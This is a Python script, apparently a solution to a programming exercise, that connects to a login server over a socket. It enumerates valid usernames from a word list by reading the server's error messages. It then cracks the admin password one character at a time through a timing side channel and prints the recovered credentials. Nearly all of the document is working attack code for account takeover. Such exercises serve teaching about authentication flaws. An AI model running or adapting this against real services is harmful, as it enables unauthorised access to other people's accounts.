import socket
import argparse
import json
import string
from time import perf_counter


parser = argparse.ArgumentParser()
parser.add_argument('hostname', type=str)
parser.add_argument('port', type=int)


args = parser.parse_args()
possible_letters = 'abcdefghijklmnopqrstuvwxyz0123456789'


def get_dictionary_word_list():
    # with context manager assures us the
    # file will be closed when leaving the scope
    with open('passwords.txt') as f:
        # return the split results, which is all the words in the file.
        return f.read().split()


def get_logins():
    # with context manager assures us the
    # file will be closed when leaving the scope
    with open('logins.txt') as f:
        # return the split results, which is all the words in the file.
        return f.read().split()


def test_credentials(sock, login, password):
    credentials = {"login": login, "password": password}
    sock.send(json.dumps(credentials).encode())
    response = sock.recv(1024)
    return json.loads(response.decode())


words = get_dictionary_word_list()
logins = get_logins()


with socket.socket() as client_socket:
    address = (args.hostname, args.port)
    client_socket.connect(address)
    adminlogin = ""
    testlogins = get_logins()
    for testlogin in testlogins:
        reply = test_credentials(client_socket, testlogin, " ")
        if reply['result'] == "Wrong password!":
            adminlogin = testlogin
            break

    adminpass = ""
    if adminlogin != "":
        characters = [c for c in string.ascii_letters] + [str(n) for n in range(10)]
        password = ""
        success = False
        while not success:
            for char in characters:
                start = perf_counter()
                reply = test_credentials(client_socket, adminlogin, password + char)
                finish = perf_counter()

                if reply['result'] == "Connection success!":
                    adminpass = password + char
                    success = True
                    break
                elif reply['result'] == "Wrong password!":
                    if finish - start >= 0.1:
                        password += char
    creds = {"login": adminlogin, "password": adminpass}
    print(json.dumps(creds))
